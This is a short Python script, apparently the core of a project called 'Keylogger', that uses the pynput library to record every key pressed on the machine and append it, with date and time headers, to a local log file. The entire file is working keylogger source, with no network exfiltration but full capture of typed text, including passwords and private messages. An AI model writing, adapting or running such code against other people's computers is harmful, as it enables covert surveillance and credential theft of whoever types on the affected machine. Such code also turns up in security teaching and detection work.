from pynput import keyboard
import datetime

t1 = datetime.datetime.now()
t1=str(t1.strftime("%x"))
t2 = datetime.datetime.now()
t2=str(t2.strftime("%X"))
now=str(t2 +" " +t1)


with open("Keylogger/logs/log.txt", 'a') as header:
    header.write("\n"+"\n"+now+"\n"+"\n")
header.close()

def keyPressed(key):
    with open("Keylogger/logs/log.txt", 'a') as logKey:
        try:
            logKey.write( key.char)
        except:
            if str(key) == "Key.space":
                logKey.write(" ")
            elif str(key) == "Key.enter":
                logKey.write("\n")
            elif str(key) == "Key.backspace":
                logKey.write("[bs]")
            elif str(key) == "Key.tab":
                logKey.write("\t")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
